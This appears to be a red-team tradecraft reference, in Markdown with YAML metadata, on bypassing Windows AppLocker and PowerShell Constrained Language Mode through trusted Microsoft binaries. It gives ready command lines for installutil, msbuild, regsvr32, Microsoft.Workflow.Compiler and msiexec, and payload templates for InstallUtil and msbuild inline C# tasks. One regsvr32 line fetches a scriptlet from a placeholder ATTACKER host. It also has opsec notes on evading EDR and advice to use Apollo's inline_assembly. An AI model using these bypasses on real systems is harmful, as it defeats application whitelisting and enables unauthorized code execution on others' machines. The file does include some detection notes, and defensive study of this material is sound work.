---
name: AppLocker Bypass Techniques
category: defense-evasion
subcategories: [applocker-bypass, application-whitelisting, clm-bypass]
tradecraft_tags: [applocker, bypass, application-whitelisting, constrained-language-mode, clm, lolbas]
mitre_attack:
  - id: T1218
    name: System Binary Proxy Execution
  - id: T1553.001
    name: Subvert Trust Controls — Gatekeeper Bypass
source:
  url: https://github.com/api0cradle/UltimateAppLockerByPassList
  license: Unknown
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  AppLocker bypass techniques use trusted Microsoft binaries to proxy execution — the
  bypass succeeds because AppLocker's default rules trust Microsoft-signed content in
  trusted paths. Detection comes from behavioral analysis: installutil.exe executing
  code with no install target, msbuild.exe running inline C# tasks, regsvr32.exe
  loading remote COM scriptlets are all anomalous uses of these binaries.
usage_examples:
  - description: Execute .NET code via installutil.exe
    args: "installutil /logfile= /LogToConsole=false /U payload.dll"
  - description: Execute .NET code via msbuild.exe (CSPROJ file)
    args: "msbuild.exe payload.csproj"
  - description: Execute via regsvr32 COM scriptlet (AppLocker bypass + CLM escape)
    args: "regsvr32.exe /s /n /u /i:payload.sct scrobj.dll"
  - description: Execute via dnscmd.exe DLL loading
    args: "dnscmd /config /serverlevelplugindll payload.dll"
  - description: Execute via MSIExec
    args: "msiexec /q /i payload.msi"
opsec_notes: |
  AppLocker bypass is primarily relevant for environments with application whitelisting.
  Modern EDR catches most LOLBin-based bypass attempts. The most reliable AppLocker bypass
  in 2026 is to use a signed Microsoft binary that AppLocker's rules trust — but the
  behavioral detection of these binaries doing unusual things is well-tuned. For
  environments with AppLocker but no behavioral EDR, these techniques are highly effective.
gotchas: |
  AppLocker's default rules have many gaps — the "All files" rule in trusted paths
  (C:\Windows, C:\Program Files) allows execution from those paths. If you can write
  to those paths (rare), the bypass is trivial. The CLM (Constrained Language Mode)
  bypass is usually the harder problem — AppLocker itself can be bypassed, but CLM
  prevents useful PowerShell. msbuild.exe and installutil.exe are the best CLM escape
  vectors.
related_ttps: [lolbas-reference, amsi-bypass, invoke-obfuscation, sharpgen]
alternatives: [lolbas-reference, donut, msbuild-bypass]
common_args: {}
last_updated: 2026-05-29
---

# AppLocker Bypass Techniques

Reference for bypassing Windows AppLocker application whitelisting. AppLocker's
default rules trust specific directories (Windows, Program Files) and Microsoft-signed
binaries — numerous LOLBins can proxy execution through these trust boundaries.

## AppLocker Default Rules Gaps

```
Default rules trust:
  - C:\Windows\* (any executable in Windows dirs)
  - C:\Program Files\* and C:\Program Files (x86)\*
  - Microsoft-signed executables anywhere

Consequence: Any Microsoft-signed binary that can load/exec arbitrary code works.
```

## Reliable AppLocker Bypass Techniques (2026)

### 1. InstallUtil (.NET code execution)

```xml
<!-- payload.dll compiled with InstallUtil handler: -->
[System.ComponentModel.RunInstaller(true)]
public class Payload : System.Configuration.Install.Installer {
    public override void Uninstall(IDictionary savedState) {
        // malicious code here
    }
}
```
```cmd
installutil /logfile= /LogToConsole=false /U payload.dll
```

### 2. MSBuild (inline C# task)

```xml
<!-- payload.csproj — C# code runs as a build task: -->
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" 
             AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          public class ClassExample : Microsoft.Build.Utilities.Task {
            public override bool Execute() {
              // malicious code
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
```cmd
msbuild.exe payload.csproj
```

### 3. Regsvr32 (COM scriptlet — also escapes CLM)

```cmd
regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll
```
Not recommended for modern environments (heavily detected).

### 4. Microsoft.Workflow.Compiler.exe

```cmd
Microsoft.Workflow.Compiler.exe payload.xml results.xml
```
Less commonly signatured than other methods.

## Constrained Language Mode (CLM) Escape

When AppLocker enforces CLM, PowerShell is restricted.
Escape via:
- `msbuild.exe` — runs C# in Full Language mode
- `installutil.exe` — runs .NET in Full Language mode  
- `regsvr32.exe` — executes JScript/VBScript outside PS context
- Running .NET assemblies directly (they bypass CLM — use Apollo inline_assembly)

## Apollo's Relationship to AppLocker

Apollo's inline_assembly runs .NET assemblies directly — these run in Full Language
mode regardless of CLM/AppLocker (CLM only restricts PowerShell, not .NET).
AppLocker restricts PowerShell (.ps1 files) but usually allows .NET EXEs from trusted
paths. Use Apollo's inline_assembly to bypass CLM in AppLocker environments entirely.
